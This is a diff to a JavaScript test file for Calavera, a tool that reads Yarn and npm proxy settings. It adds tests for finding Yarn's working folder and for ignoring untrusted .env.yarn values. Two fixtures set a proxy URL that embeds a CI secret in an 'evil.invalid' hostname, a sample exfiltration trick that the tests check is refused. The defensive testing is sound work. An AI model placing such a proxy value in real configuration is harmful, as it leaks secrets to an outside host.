@@ -2176,7 +2176,7 @@ test("under Yarn without /proc, a candidate set that cannot be bounded makes eve
   const result = await loadNpmRegistryOptions({ ...context, env, yarnProcessCwd: null });
   assert.equal(result.options.proxy, undefined);
   assert.deepEqual(result.warnings, [
-    "Ignored YARN_HTTPS_PROXY: Calavera cannot tell which environment files Yarn loaded for this run, because it cannot see the folder Yarn ran in, and Yarn passed no PROJECT_CWD, so the folders Yarn could have run in are unknown. List the file in injectEnvironmentFiles in the project's .yarnrc.yml, so Calavera can tell whether Yarn loaded it.",
+    "Ignored YARN_HTTPS_PROXY: Calavera cannot tell which environment files Yarn loaded for this run, because it cannot see the folder Yarn ran in, and Yarn passed no PROJECT_CWD, so the folders Yarn could have run in are unknown. List the file Yarn loads in injectEnvironmentFiles in the project's .yarnrc.yml, or an empty list if it loads none, so Calavera can tell.",
   ]);
   // A project with more folders than Calavera walks cannot be bounded either.
   const large = await fixture({
@@ -2222,11 +2222,7 @@ test("under Yarn, the folder Yarn ran in decides the default .env.yarn, also und
   assert.equal(result.registry.origin, "https://caller-mirror.example.com");
 });
 
-test("yarnParentCwd reads the working folder of a Yarn parent process from /proc, and nothing otherwise", async () => {
-  const reads = {
-    cmdline: "node\0/usr/lib/node_modules/corepack/dist/yarn.js\0workspace\0",
-    cwd: "/repo",
-  };
+test("yarnParentCwd reads the working folder of a Yarn parent process from /proc on Linux, only when the parent runs Yarn", async () => {
   /** @param {string} cmdline @param {string} [platform] */
   const read = (cmdline, platform = "linux") =>
     yarnParentCwd({
@@ -2238,12 +2234,90 @@ test("yarnParentCwd reads the working folder of a Yarn parent process from /proc
       },
       readlink: async (path) => {
         assert.equal(path, "/proc/4242/cwd");
-        return reads.cwd;
+        return "/repo";
+      },
+      run: async () => {
+        throw new Error("not on Linux");
       },
     });
-  assert.equal(await read(reads.cmdline), "/repo");
-  assert.equal(await read("node\0/usr/bin/npm-cli.js\0"), null);
-  assert.equal(await read(reads.cmdline, "darwin"), null);
+  for (const yarn of [
+    "node\0/usr/lib/node_modules/corepack/dist/yarn.js\0workspace\0",
+    "node\0/home/u/.cache/node/corepack/v1/yarn/4.18.1/yarn.js\0exec\0",
+    "node\0/repo/.yarn/releases/yarn-4.18.1.cjs\0run\0",
+    "/usr/local/bin/yarn\0run\0",
+  ]) {
+    assert.equal(await read(yarn), "/repo", yarn);
+  }
+  // A shell script whose name or arguments merely mention yarn is not Yarn.
+  for (const other of [
+    "sh\0./scripts/yarn-ci.sh\0",
+    "node\0/usr/bin/npm-cli.js\0exec\0yarn\0",
+    "bash\0-c\0cd packages/app && yarn-like\0",
+  ]) {
+    assert.equal(await read(other), null, other);
+  }
+  assert.equal(await read("node\0/x/yarn.js\0", "win32"), null);
+});
+
+test("yarnParentCwd asks ps and lsof on macOS, only when the parent runs Yarn", async () => {
+  /** @param {string} args */
+  const read = (args) =>
+    yarnParentCwd({
+      platform: "darwin",
+      ppid: 4242,
+      readFile: async () => {
+        throw new Error("no /proc");
+      },
+      readlink: async () => {
+        throw new Error("no /proc");
+      },
+      run: async (command, commandArgs) => {
+        if (command === "ps") {
+          assert.deepEqual(commandArgs, ["-o", "args=", "-p", "4242"]);
+          return `${args}\n`;
+        }
+        assert.equal(command, "lsof");
+        assert.deepEqual(commandArgs, ["-a", "-d", "cwd", "-p", "4242", "-Fn"]);
+        return "p4242\nfcwd\nn/Users/u/repo\n";
+      },
+    });
+  assert.equal(
+    await read("node /Users/u/.cache/node/corepack/v1/yarn/4.18.1/yarn.js --cwd ../proj probe"),
+    "/Users/u/repo",
+  );
+  assert.equal(await read("sh ./scripts/yarn-ci.sh"), null);
+});
+
+test("under Yarn without a known folder, a candidate's claim stays although a later candidate sets the same variable literally", async () => {
+  // Yarn loaded at most one candidate, so a literal value in another cannot replace the claim.
+  const context = await fixture({
+    userAgent: YARN,
+    files: {
+      "workspace/project/.env.yarn": "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
+      "workspace/project/packages/app/.env.yarn": "YARN_HTTPS_PROXY=http://plain.example.com:1\n",
+    },
+    env: { CI_SECRET, YARN_HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1` },
+  });
+  const result = await loadNpmRegistryOptions({ ...context, yarnProcessCwd: null });
+  assert.equal(result.options.proxy, undefined);
+  assert.deepEqual(result.warnings, [
+    "Ignored YARN_HTTPS_PROXY, which .env.yarn sets from a variable, and Yarn may have loaded that file: Calavera cannot see the folder Yarn ran in, which decides which .env.yarn Yarn read, and Calavera does not take a variable's value from a project file. Write the value without a variable in .env.yarn, or list the file Yarn loads in injectEnvironmentFiles in the project's .yarnrc.yml, or an empty list if it loads none, so Calavera can tell.",
+  ]);
+});
+
+test("under Yarn without a known folder, dot-folders are not searched for a .env.yarn", async () => {
+  const context = await fixture({
+    userAgent: YARN,
+    files: {
+      "workspace/project/.next/cache/.env.yarn":
+        "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
+    },
+    env: { YARN_HTTPS_PROXY: "http://caller.example.com:1" },
+  });
+  assert.equal(
+    (await loadNpmRegistryOptions({ ...context, yarnProcessCwd: null })).options.proxy,
+    "http://caller.example.com:1",
+  );
 });
 
 test("under Yarn, a string or an onConflict form of injectEnvironmentFiles, which Calavera does not model, makes every variable ignored", async () => {
